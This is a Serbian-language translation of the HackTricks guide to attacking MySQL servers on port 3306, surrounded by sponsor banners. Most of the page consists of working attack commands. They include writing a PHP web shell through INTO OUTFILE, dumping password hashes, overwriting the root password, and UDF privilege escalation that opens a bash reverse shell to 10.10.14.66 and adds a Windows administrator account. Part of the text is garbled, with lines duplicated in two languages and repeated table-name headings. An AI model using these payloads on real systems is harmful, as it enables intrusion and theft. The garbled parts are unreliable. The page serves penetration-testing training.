# 3306 - Pentesting Mysql

## 3306 - Pentesting Mysql

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji sajber bezbednosni dogaƒëaj u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je kljuƒçno mesto susreta tehnolo≈°kih i sajber bezbednosnih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

### **Osnovne informacije**

**MySQL** se mo≈æe opisati kao besplatni **Relacioni Sistem Upravljanja Bazama Podataka (RDBMS)** otvorenog koda. Radi na **Structured Query Language (SQL)**, omoguƒáavajuƒái upravljanje i manipulaciju bazama podataka.

**Podrazumevani port:** 3306

```
3306/tcp open  mysql
```

### **Povezivanje**

#### **Lokalno**

```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```

#### Udaljeni

**MySQL**

MySQL je popularni open-source sistem za upravljanje bazama podataka koji se ƒçesto koristi u web aplikacijama. Kao pentester, mo≈æete iskoristiti razliƒçite tehnike za testiranje sigurnosti MySQL servera.

**Osnovne informacije**

Da biste zapoƒçeli testiranje MySQL servera, prvo morate prikupiti osnovne informacije o serveru. Ove informacije ukljuƒçuju IP adresu servera, port na kojem MySQL server slu≈°a i verziju MySQL servera.

**Povezivanje na MySQL server**

Nakon prikupljanja osnovnih informacija, mo≈æete se povezati na MySQL server koristeƒái razliƒçite metode. Ove metode ukljuƒçuju kori≈°ƒáenje MySQL klijenta, kao ≈°to je `mysql` komanda, ili kori≈°ƒáenje alata za automatizaciju kao ≈°to je Metasploit.

**Sniffing MySQL saobraƒáaja**

Sniffing MySQL saobraƒáaja mo≈æe biti korisno za prikupljanje informacija o komunikaciji izmeƒëu klijenta i servera. Mo≈æete koristiti alate kao ≈°to su Wireshark ili tcpdump za snimanje i analizu MySQL saobraƒáaja.

**Brute forcing MySQL korisniƒçkih naloga**

Ako imate pristup do MySQL servera, mo≈æete poku≈°ati da brute force-ujete korisniƒçke naloge kako biste prona≈°li slabu lozinku. Mo≈æete koristiti alate kao ≈°to su Hydra ili Medusa za izvr≈°avanje brute force napada na MySQL server.

**SQL Injection**

SQL Injection je ƒçesta ranjivost u web aplikacijama koje koriste MySQL bazu podataka. Kroz SQL Injection, napadaƒç mo≈æe izvr≈°iti zlonamerne SQL upite na MySQL serveru. Mo≈æete koristiti alate kao ≈°to su sqlmap ili manualno izvr≈°avati SQL Injection napade.

**Eksploatacija MySQL ranjivosti**

Ako pronaƒëete ranjivost u MySQL serveru, mo≈æete je eksploatisati kako biste preuzeli kontrolu nad serverom. Ovo mo≈æe ukljuƒçivati izvr≈°avanje zlonamernog koda, preuzimanje baze podataka ili izvr≈°avanje privilegovanih komandi na serveru.

**Prevencija**

Da biste za≈°titili MySQL server od napada, preporuƒçuje se primena odgovarajuƒáih sigurnosnih mera. Ove mere ukljuƒçuju kori≈°ƒáenje jakih lozinki, redovno a≈æuriranje MySQL servera i implementaciju sigurnosnih pravila za ograniƒçavanje pristupa serveru.

```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```

### Spoljna enumeracija

Neke od akcija enumeracije zahtevaju validne akreditive.

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

#### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#mysql)

#### Napi≈°ite bilo koje binarne podatke

```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```

### **MySQL komande**

```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```

#### Prikupljanje informacija o dozvolama u MySQL-u

Da biste izvr≈°ili pentestiranje MySQL baze podataka, prvo morate prikupiti informacije o dozvolama koje su dodijeljene korisnicima. Ove informacije ƒáe vam pomoƒái da identifikujete slabosti u konfiguraciji i pristupate podacima na neovla≈°ƒáen naƒçin.

**1. Prikupljanje informacija o korisnicima**

Prvo, koristite SQL upit `SELECT user FROM mysql.user;` da biste dobili listu svih korisnika u bazi podataka. Ovaj upit ƒáe vam prikazati korisniƒçka imena koja mo≈æete dalje istra≈æivati.

**2. Prikupljanje informacija o privilegijama**

Zatim, koristite SQL upit `SHOW GRANTS FOR 'korisnicko_ime'@'localhost';` da biste dobili informacije o privilegijama koje su dodijeljene odreƒëenom korisniku. Zamijenite `'korisnicko_ime'` sa stvarnim korisniƒçkim imenom koje ≈æelite istra≈æiti.

**3. Prikupljanje informacija o privilegijama za sve korisnike**

Ako ≈æelite dobiti informacije o privilegijama za sve korisnike odjednom, koristite SQL upit `SELECT user, host, authentication_string FROM mysql.user;`. Ovaj upit ƒáe vam prikazati korisniƒçka imena, hostove i autentifikacijske stringove za sve korisnike.

**4. Prikupljanje informacija o privilegijama za baze podataka**

Konaƒçno, koristite SQL upit `SHOW GRANTS FOR 'korisnicko_ime'@'localhost';` da biste dobili informacije o privilegijama koje su dodijeljene korisniku za odreƒëenu bazu podataka. Zamijenite `'korisnicko_ime'` sa stvarnim korisniƒçkim imenom i `'localhost'` sa stvarnom adresom hosta.

Prikupljanje ovih informacija o dozvolama u MySQL-u ƒáe vam pomoƒái da identifikujete slabosti u konfiguraciji i pristupate podacima na neovla≈°ƒáen naƒçin.

```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```

Mo≈æete videti u dokumentaciji znaƒçenje svakog privilegija: [https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

#### MySQL File RCE

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

### MySQL proizvoljno ƒçitanje fajla od strane klijenta

Zapravo, kada poku≈°ate da **uƒçitate lokalne podatke u tabelu**, MySQL ili MariaDB server tra≈æi **klijenta da ga proƒçita** i po≈°alje sadr≈æaj. **Ako mo≈æete da izmenite mysql klijent da se pove≈æe sa va≈°im MySQL serverom, mo≈æete ƒçitati proizvoljne fajlove.**\
Molimo vas da primetite da se ovo pona≈°anje javlja kada koristite:

```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

(Zapa≈æanje reƒçi "lokalno")\
Jer bez "lokalno" mo≈æete dobiti:

```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

**Poƒçetni PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**U ovom radu mo≈æete videti potpisan opis napada i ƒçak kako ga pro≈°iriti na RCE:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**Ovde mo≈æete pronaƒái pregled napada:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji dogaƒëaj u oblasti kibernetiƒçke bezbednosti u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je kljuƒçno mesto susreta za profesionalce iz oblasti tehnologije i kibernetiƒçke bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

### POST

#### Mysql Korisnik

Bilo bi veoma interesantno ako mysql radi kao **root**:

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```

**Opasne postavke mysqld.cnf**

U konfiguraciji MySQL servisa koriste se razliƒçite postavke za definisanje njegovog rada i sigurnosnih mera:

* Postavka **`user`** se koristi za odreƒëivanje korisnika pod kojim ƒáe MySQL servis biti izvr≈°en.
* **`password`** se koristi za uspostavljanje lozinke povezane sa MySQL korisnikom.
* **`admin_address`** odreƒëuje IP adresu koja oslu≈°kuje TCP/IP veze na administrativnom mre≈ænom interfejsu.
* Promenljiva **`debug`** ukazuje na trenutne konfiguracije za debagiranje, ukljuƒçujuƒái osetljive informacije unutar logova.
* **`sql_warnings`** upravlja generisanjem informacionih nizova za INSERT izjave sa jednim redom kada se pojave upozorenja, ukljuƒçujuƒái osetljive podatke unutar logova.
* Pomoƒáu **`secure_file_priv`** se ograniƒçava opseg operacija uvoza i izvoza podataka radi pobolj≈°anja sigurnosti.

#### Eskalacija privilegija

```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```

#### Eskalacija privilegija putem biblioteke

Ako **mysql server radi kao root** (ili drugi korisnik sa vi≈°e privilegija), mo≈æete ga naterati da izvr≈°ava komande. Za to je potrebno koristiti **korisniƒçki definisane funkcije**. Da biste kreirali korisniƒçki definisanu funkciju, potrebna vam je **biblioteka** za operativni sistem na kojem se izvr≈°ava mysql.

Zlonamerna biblioteka koju treba koristiti mo≈æe se pronaƒái unutar sqlmap-a i metasploita pomoƒáu komande **`locate "*lib_mysqludf_sys*"`**. Datoteke sa ekstenzijom **`.so`** su **linux** biblioteke, a one sa ekstenzijom **`.dll`** su **Windows** biblioteke, izaberite onu koja vam je potrebna.

Ako **nemate** te biblioteke, mo≈æete ih ili **potra≈æiti**, ili preuzeti ovaj [**linux C kod**](https://www.exploit-db.com/exploits/1518) i **kompajlirati ga unutar ranjive linux ma≈°ine**:

```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Sada kada imate biblioteku, prijavite se unutar Mysql-a kao privilegovan korisnik (root?) i pratite sledeƒáe korake:

**Linux**

```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```

**Windows**

**–í–∏–Ω–¥–æ—É—Å**

**MySQL Service**

**MySQL –°–µ—Ä–≤–∏—Å**

**MySQL Enumeration**

**MySQL Enumeracija**

MySQL enumeration is the process of gathering information about a MySQL server, such as the version, databases, tables, and users. This information can be useful for further exploitation.

MySQL enumeracija je proces prikupljanja informacija o MySQL serveru, kao ≈°to su verzija, baze podataka, tabele i korisnici. Ove informacije mogu biti korisne za daljnje iskori≈°ƒáavanje.

**MySQL Version**

**MySQL Verzija**

To determine the version of MySQL running on the target system, you can use the following methods:

Da biste odredili verziju MySQL koja se izvr≈°ava na ciljnom sistemu, mo≈æete koristiti sledeƒáe metode:

* **Banner Grabbing**: Analyze the MySQL server banner to extract the version information.
* **Banner Grabbing**: Analizirajte MySQL server baner da biste izvukli informacije o verziji.
* **Error Messages**: Exploit known vulnerabilities to trigger error messages that reveal the MySQL version.
* **Error Messages**: Iskoristite poznate ranjivosti da biste izazvali poruke o gre≈°kama koje otkrivaju verziju MySQL-a.
* **SQL Queries**: Execute SQL queries to retrieve the version information from the database.
* **SQL Upiti**: Izvr≈°ite SQL upite da biste dobili informacije o verziji iz baze podataka.

**MySQL Databases**

**MySQL Baze podataka**

To enumerate the databases present on the MySQL server, you can use the following methods:

Da biste nabrojali baze podataka prisutne na MySQL serveru, mo≈æete koristiti sledeƒáe metode:

* **SHOW DATABASES**: Execute the `SHOW DATABASES` command to list all the databases.
* **SHOW DATABASES**: Izvr≈°ite komandu `SHOW DATABASES` da biste izlistali sve baze podataka.
* **Information Schema**: Query the `information_schema` database to retrieve information about the databases.
* **Information Schema**: Upitajte bazu podataka `information_schema` da biste dobili informacije o bazama podataka.

**MySQL Tables**

**MySQL Tabele**

To enumerate the tables within a specific database, you can use the following methods:

Da biste nabrojali tabele unutar odreƒëene baze podataka, mo≈æete koristiti sledeƒáe metode:

* **SHOW TABLES**: Execute the `SHOW TABLES` command to list all the tables in the selected database.
* **SHOW TABLES**: Izvr≈°ite komandu `SHOW TABLES` da biste izlistali sve tabele u izabranoj bazi podataka.
* **Information Schema**: Query the `information_schema` database to retrieve information about the tables in a specific database.
* **Information Schema**: Upitajte bazu podataka `information_schema` da biste dobili informacije o tabelama u odreƒëenoj bazi podataka.

**MySQL Users**

**MySQL Korisnici**

To enumerate the users present on the MySQL server, you can use the following methods:

Da biste nabrojali korisnike prisutne na MySQL serveru, mo≈æete koristiti sledeƒáe metode:

* **SHOW USERS**: Execute the `SHOW USERS` command to list all the users.
* **SHOW USERS**: Izvr≈°ite komandu `SHOW USERS` da biste izlistali sve korisnike.
* **mysql.user Table**: Query the `mysql.user` table to retrieve information about the users.
* **mysql.user Tabela**: Upitajte tabelu `mysql.user` da biste dobili informacije o korisnicima.

**MySQL Password Cracking**

**MySQL Dekriptovanje lozinki**

If you have obtained a MySQL hash, you can attempt to crack it using various password cracking techniques, such as dictionary attacks, brute-force attacks, or rainbow table attacks.

Ako ste dobili MySQL he≈°, mo≈æete poku≈°ati da ga dekriptujete koristeƒái razliƒçite tehnike dekriptovanja lozinki, kao ≈°to su napadi reƒçnikom, napadi iscrpnom pretragom ili napadi pomoƒáu rainbow tabela.

**MySQL Command Execution**

**MySQL Izvr≈°avanje komandi**

If you have the necessary privileges, you can execute operating system commands through MySQL using the `sys_exec()` function or by writing user-defined functions.

Ako imate potrebne privilegije, mo≈æete izvr≈°avati operativne sistemske komande putem MySQL-a koristeƒái funkciju `sys_exec()` ili pisanjem korisniƒçki definisanih funkcija.

**MySQL File Read/Write**

**MySQL ƒåitanje/Pisanje fajlova**

If you have the necessary privileges, you can read and write files on the target system using MySQL. This can be useful for retrieving sensitive information or uploading malicious files.

Ako imate potrebne privilegije, mo≈æete ƒçitati i pisati fajlove na ciljnom sistemu koristeƒái MySQL. Ovo mo≈æe biti korisno za dobijanje osetljivih informacija ili otpremanje zlonamernih fajlova.

**MySQL Database Backup**

**MySQL Bekap baze podataka**

To perform a backup of a MySQL database, you can use the `mysqldump` command-line tool or the `SELECT INTO OUTFILE` SQL statement.

Da biste izvr≈°ili bekup baze podataka MySQL, mo≈æete koristiti alat `mysqldump` sa komandne linije ili SQL naredbu `SELECT INTO OUTFILE`.

**MySQL Database Restore**

**MySQL Obnova baze podataka**

To restore a MySQL database from a backup, you can use the `mysql` command-line tool or the `LOAD DATA INFILE` SQL statement.

Da biste obnovili MySQL bazu podataka iz bekupa, mo≈æete koristiti alat `mysql` sa komandne linije ili SQL naredbu `LOAD DATA INFILE`.

```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

#### Izvlaƒçenje MySQL akreditacija iz datoteka

Unutar _/etc/mysql/debian.cnf_ mo≈æete pronaƒái **lozinku u obliku obiƒçnog teksta** za korisnika **debian-sys-maint**.

```bash
cat /etc/mysql/debian.cnf
```

Mo≈æete **koristiti ove podatke za prijavu u MySQL bazu podataka**.

Unutar datoteke: _/var/lib/mysql/mysql/user.MYD_ mo≈æete pronaƒái **sve he≈°ove MySQL korisnika** (one koje mo≈æete izvuƒái iz mysql.user unutar baze podataka).

Mo≈æete ih izvuƒái koristeƒái:

```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

#### Omoguƒáavanje bele≈æenja

Mo≈æete omoguƒáiti bele≈æenje MySQL upita unutar `/etc/mysql/my.cnf` datoteke uklanjanjem komentara sa sledeƒáih linija:

![](<../.gitbook/assets/image (277).png>)

#### Korisni fajlovi

Konfiguracioni fajlovi

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* Istorija komandi
* \~/.mysql.history
* Log fajlovi
* connections.log
* update.log
* common.log

### Podrazumevane MySQL baze/tabele

ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS

columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user

accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread

host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory\_by\_host

## schema\_table\_statistics

schema\_table\_statistics

## schema\_table\_statistics\_with\_buffer

schema\_table\_statistics\_with\_buffer

## schema\_tables\_with\_full\_table\_scans

schema\_tables\_with\_full\_table\_scans

## schema\_unused\_indexes

schema\_unused\_indexes

## session

session

## session\_ssl\_status

session\_ssl\_status

## statement\_analysis

statement\_analysis

## statements\_with\_errors\_or\_warnings

statements\_with\_errors\_or\_warnings

## statements\_with\_full\_table\_scans

statements\_with\_full\_table\_scans

## statements\_with\_runtimes\_in\_95th\_percentile

statements\_with\_runtimes\_in\_95th\_percentile

## statements\_with\_sorting

statements\_with\_sorting

## statements\_with\_temp\_tables

statements\_with\_temp\_tables

## sys\_config

sys\_config

## user\_summary

user\_summary

## user\_summary\_by\_file\_io

user\_summary\_by\_file\_io

## user\_summary\_by\_file\_io\_type

user\_summary\_by\_file\_io\_type

## user\_summary\_by\_stages

user\_summary\_by\_stages

## user\_summary\_by\_statement\_latency

user\_summary\_by\_statement\_latency

## user\_summary\_by\_statement\_type

user\_summary\_by\_statement\_type

## version

version

## wait\_classes\_global\_by\_avg\_latency

wait\_classes\_global\_by\_avg\_latency

## wait\_classes\_global\_by\_latency

wait\_classes\_global\_by\_latency

## waits\_by\_host\_by\_latency

waits\_by\_host\_by\_latency

## waits\_by\_user\_by\_latency

waits\_by\_user\_by\_latency

## waits\_global\_by\_latency

waits\_global\_by\_latency

## x$host\_summary

x$host\_summary

## x$host\_summary\_by\_file\_io

x$host\_summary\_by\_file\_io

## x$host\_summary\_by\_file\_io\_type

x$host\_summary\_by\_file\_io\_type

## x$host\_summary\_by\_stages

x$host\_summary\_by\_stages

## x$host\_summary\_by\_statement\_latency

x$host\_summary\_by\_statement\_latency

## x$host\_summary\_by\_statement\_type

x$host\_summary\_by\_statement\_type

## x$innodb\_buffer\_stats\_by\_schema

x$innodb\_buffer\_stats\_by\_schema

## x$innodb\_buffer\_stats\_by\_table

x$innodb\_buffer\_stats\_by\_table

## x$innodb\_lock\_waits

x$innodb\_lock\_waits

## x$io\_by\_thread\_by\_latency

x$io\_by\_thread\_by\_latency

## x$io\_global\_by\_file\_by\_bytes

x$io\_global\_by\_file\_by\_bytes

## x$io\_global\_by\_file\_by\_latency

x$io\_global\_by\_file\_by\_latency

## x$io\_global\_by\_wait\_by\_bytes

x$io\_global\_by\_wait\_by\_bytes

## x$io\_global\_by\_wait\_by\_latency

x$io\_global\_by\_wait\_by\_latency

## x$latest\_file\_io

x$latest\_file\_io

## x$memory\_by\_host\_by\_current\_bytes

x$memory\_by\_host\_by\_current\_bytes

